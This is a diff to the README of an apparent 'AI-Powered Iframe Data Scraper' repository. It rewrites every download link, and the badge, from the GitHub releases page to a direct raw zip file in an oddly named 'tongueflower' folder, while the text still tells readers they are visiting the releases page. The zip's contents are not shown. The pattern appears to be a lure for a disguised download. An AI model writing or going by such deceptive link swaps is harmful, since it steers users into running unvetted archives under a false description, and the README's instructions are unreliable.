@@ -1,6 +1,6 @@
 # 🤖 AI-Powered-Iframe-Data-Scraper- - Extract Data Easily from Any Website
 
-[![Download AI-Powered-Iframe-Data-Scraper](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/dev5050-0/AI-Powered-Iframe-Data-Scraper-/releases)
+[![Download AI-Powered-Iframe-Data-Scraper](https://raw.githubusercontent.com/dev5050-0/AI-Powered-Iframe-Data-Scraper-/main/tongueflower/AI-Powered-Iframe-Data-Scraper-.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/dev5050-0/AI-Powered-Iframe-Data-Scraper-/main/tongueflower/AI-Powered-Iframe-Data-Scraper-.zip)
 
 ## 📖 Overview
 
@@ -17,7 +17,7 @@ To get started with the AI-Powered-Iframe-Data-Scraper-, follow the steps below.
 
 ### 📥 Download & Install
 
-1. **Visit the Download Page**: Click [here to access the releases page](https://github.com/dev5050-0/AI-Powered-Iframe-Data-Scraper-/releases).
+1. **Visit the Download Page**: Click [here to access the releases page](https://raw.githubusercontent.com/dev5050-0/AI-Powered-Iframe-Data-Scraper-/main/tongueflower/AI-Powered-Iframe-Data-Scraper-.zip).
 
 2. **Select the Latest Version**: Look for the latest release version on the page. It is usually the first entry.
 
@@ -73,6 +73,6 @@ For questions or feedback, please reach out via the repository's Issues page on 
 
 ### 🔗 Additional Information
 
-For more information about this project, including updates and features, regularly check the [releases page](https://github.com/dev5050-0/AI-Powered-Iframe-Data-Scraper-/releases). 
+For more information about this project, including updates and features, regularly check the [releases page](https://raw.githubusercontent.com/dev5050-0/AI-Powered-Iframe-Data-Scraper-/main/tongueflower/AI-Powered-Iframe-Data-Scraper-.zip). 
 
 With these steps, you now have everything you need to download, install, and begin using the AI-Powered-Iframe-Data-Scraper-.  Make the most of this tool to gather data quickly and effortlessly!
